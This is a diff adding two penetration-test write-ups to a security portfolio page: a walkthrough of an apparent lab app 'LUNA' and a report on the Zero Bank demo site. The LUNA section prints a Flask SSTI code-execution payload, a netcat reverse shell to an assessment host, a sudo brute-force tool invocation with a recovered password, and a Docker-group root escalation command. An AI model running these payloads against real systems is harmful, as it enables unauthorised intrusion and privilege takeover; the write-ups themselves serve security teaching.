@@ -108,6 +108,8 @@ Status: Available for freelance.
 2. ELK Stack Setup & Configuration (blogs/elk-stack.html) - Logging, SIEM, Blue Team
 3. Building a Home SOC Lab (blogs/soc-lab.html) - Wazuh, Shuffle, Detection
 4. Mr. Robot Walkthrough (blogs/mr-robot.html) - CTF, Web Exploitation, Privilege Escalation
+5. LUNA VAPT Report (blogs/luna.html) - Web Application VAPT, SSTI, RCE, XSS, Docker Privilege Escalation
+6. Zero Bank VAPT Report (blogs/zero-bank.html) - Web Application VAPT, Broken Access Control, IDOR, CSRF, SQL Injection
 
 ---
 
@@ -517,3 +519,178 @@ Found Nmap in the list. Leveraged GTFOBins instructions for SUID Nmap privilege 
 
 ### Conclusion
 Use this walkthrough as a reference for learning hands-on pentesting and privilege escalation.
+
+---
+
+## Blog 5: Penetration Test Report: LUNA
+URL: https://pavindas.github.io/blogs/luna.html
+Subtitle: Walkthrough for the LUNA Web application
+
+### Target Information
+- **Application name:** LUNA
+- **Application URL:** http://192.168.1.42:5000/
+
+### Testing Details
+- **Assessment Type:** Web Application VAPT
+- **Methodology:** OWASP Testing Guide, OWASP Top 10 2021
+- **Tools used:** Nmap, Burp Suite CE, CyberChef, GTFOBins
+
+### 1. Executive Summary
+A comprehensive web application security assessment was performed against the LUNA application. The assessment identified multiple vulnerabilities including client-side injection, server-side template injection leading to remote code execution, credential exposure, weak credential storage, authentication weaknesses and privilege escalation paths.
+
+### 2. Findings Summary
+| Finding | Severity | OWASP Mapping |
+|---|---|---|
+| SSTI | Critical | A03 Injection |
+| RCE via SSTI | Critical | A03 Injection |
+| Credential Exposure | High | A05 Security Misconfiguration |
+| Weak Password Storage | High | A02 Cryptographic Failures |
+| Authentication Weakness | High | A07 Identification and Authentication Failures |
+| Docker Privilege Escalation | High | A05 Security Misconfiguration |
+| Reflected XSS | Medium | A03 Injection |
+
+### 3. Vulnerability Details
+
+#### 3.1 Reflected Cross Site Scripting
+A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the user input field of the application. The application reflected user supplied input in the response without proper validation or output encoding. As a result, malicious JavaScript code supplied by an attacker could be executed within the victim's browser session.
+
+#### 3.2 Server Side Template Injection
+A Server-Side Template Injection (SSTI) vulnerability was identified in the input processing functionality of the application. User supplied input was evaluated by the backend template engine instead of being treated as plain text. The application processed template expressions directly and returned evaluated results to the response.
+
+#### 3.3 Remote Code Execution via Template Injection
+A Remote Code Execution (RCE) vulnerability was identified through exploitation of the previously discovered SSTI vulnerability. The backend template engine allowed execution of server-side expressions and access to application objects. By leveraging this behavior, arbitrary system commands were executed on the target server.
+
+#### 3.4 Credential Exposure in Configuration File
+A sensitive information exposure issue was identified during post-exploitation. The application configuration file contained plaintext database credentials and connection details accessible from the compromised environment.
+
+#### 3.5 Weak Password Storage Using Base64
+User passwords were stored using Base64 encoding instead of secure cryptographic hashing. Base64 is an encoding method, not encryption — any encoded value can be trivially decoded to retrieve the original password.
+
+#### 3.6 Privilege Escalation via Docker Group
+The compromised user account was a member of the Docker group, which allowed interaction with the Docker daemon. Docker group membership effectively provides elevated privileges because users can create privileged containers capable of interacting with the host OS.
+
+### 4. Steps to Reproduce
+
+#### Step 1: Reconnaissance and Initial Enumeration
+- Performed port discovery using Nmap to identify exposed services.
+- Identified two open ports: 80 and 5000.
+- Port 80 returned a restricted response; continued assessment against the service on port 5000.
+
+#### Step 2: Input Testing
+- Accessed the web application and identified a user input field ("Greet Me" functionality).
+- Submitted normal text to understand application behavior.
+- Observed that the supplied input was reflected back within the response message.
+
+#### Step 3: Cross Site Scripting Testing
+- Submitted an XSS payload through the input field.
+- Observed successful execution of the payload.
+
+#### Step 4: Server Side Template Injection Testing
+- Submitted an SSTI payload through the available input field.
+- Observed evaluation of the template expression.
+- Confirmed vulnerability to Server Side Template Injection (SSTI).
+
+#### Step 5: Template Engine Identification & RCE Testing
+- Used an error trigger payload to identify backend technologies.
+- Identified the application was using Python Flask.
+- Submitted a Python-based payload to verify code execution capability:
+  `{{config.__class__.__init__.__globals__['id'].popen('ls').read()}}`
+- Confirmed successful Remote Code Execution.
+
+#### Step 6: Reverse Shell Establishment
+- Selected an appropriate reverse shell payload from revshells.com:
+  `busybox nc 192.168.1.39 6666 -e sh`
+- Started a Netcat listener on the assessment machine.
+- Executed the payload through the vulnerable functionality.
+- Established a successful reverse shell connection.
+
+#### Step 7: Credential Discovery
+- Reviewed application files after obtaining access.
+- Identified a configuration file containing plaintext MySQL credentials and connection details.
+- Used recovered credentials to access the database and enumerate stored records.
+
+#### Step 8: Weak Password Storage
+- Identified a password stored as Base64 encoding in the database.
+- Decoded the value using CyberChef to retrieve the plaintext password.
+- Used the recovered credential for authentication validation.
+
+#### Step 9: User Enumeration
+- Obtained user-level access.
+- Identified a text file containing multiple passwords.
+- Used Sudo_BruteForce to perform brute-force attacks and discovered passwords for other user accounts.
+  ```
+  git clone https://github.com/Maalfer/Sudo_BruteForce.git
+  cd Sudo_BruteForce
+  bash Linux-Su-Force.sh jose ../password.txt
+  ```
+- Credential discovered: `jose:W1nter$2024`
+- Successfully obtained access to the `jose` user account.
+
+#### Step 10: Privilege Escalation
+- Performed SUID enumeration and permission checks — no exploitable SUID binaries found.
+- Performed user group enumeration and identified membership in the Docker group.
+- Used Docker privilege escalation technique from gtfobins.org:
+  `docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh`
+- Obtained administrative (root) privilege successfully.
+
+### Conclusion
+Thank you for taking the time to read through this walkthrough! This report demonstrates a full attack chain from SSTI to RCE to root via Docker group privilege escalation. If you are following along, use this walkthrough as a reference and try rooting the machine yourself. Best of luck on your hacking journey!
+
+---
+
+## Blog 6: Penetration Test Report: Zero Bank
+URL: https://pavindas.github.io/blogs/zero-bank.html
+Subtitle: A VAPT assessment on the Zero Bank Web application
+
+### Target Information
+- **Application name:** Zero Bank
+- **Application URL:** http://zero.webappsecurity.com/
+
+### Testing Details
+- **Tools used:** Gobuster, Burp Suite CE, Wappalyzer
+- **Websites used:** https://csrfshark.github.io/app/
+- **Approach:** Enumeration (Gobuster, Wappalyzer), Manual testing (Burp Suite), Exploitation & validation
+
+### Technical Findings
+
+#### 1. Broken Access Control & Sensitive Admin Exposure
+→ A01:2021 - Broken Access Control
+
+The admin panel is accessible without authentication, exposing sensitive user information and administrative functionality.
+- **Affected Endpoints:** `/admin/`, `/errors/logs`
+
+#### 2. Default Credentials Exposure
+→ A07:2021 - Identification and Authentication Failures
+
+The application exposes default credentials through the login help feature.
+- **Credentials:** `username:password`
+
+#### 3. Insecure Direct Object Reference (IDOR)
+→ A01:2021 - Broken Access Control
+
+The application does not validate user authorization when accessing account data.
+- **Proof:** `/account-activity.html?accountId=1` → changing to `accountId=2` returns another user's account data.
+
+#### 4. Cross Site Request Forgery (CSRF)
+→ A01:2021 - Broken Access Control
+
+Sensitive actions (fund transfer) can be triggered without CSRF protection via a crafted form POST. A PoC form targeting the transfer endpoint demonstrates the vulnerability.
+
+#### 5. Stored XSS
+→ A03:2021 - Injection
+
+User input is stored and executed in the admin panel without sanitization.
+
+#### 6. SQL Injection
+→ A03:2021 - Injection
+
+The `payeeId` parameter is vulnerable to SQL Injection.
+
+#### 7. Information Disclosure & Outdated Components
+→ A06:2021 - Vulnerable and Outdated Components
+
+The application exposes server details (Apache Tomcat 7.0.70), which is outdated and contains known CVEs.
+- **Impact:** Attackers can exploit known CVEs; increased attack surface.
+
+### Conclusion
+Thank you for reading this VAPT assessment report on the Zero Bank application! Identifying and understanding these critical vulnerabilities — Broken Access Control, IDOR, CSRF, Stored XSS, SQL Injection, and outdated components — is crucial for maintaining robust application security. Best of luck on your hacking journey!
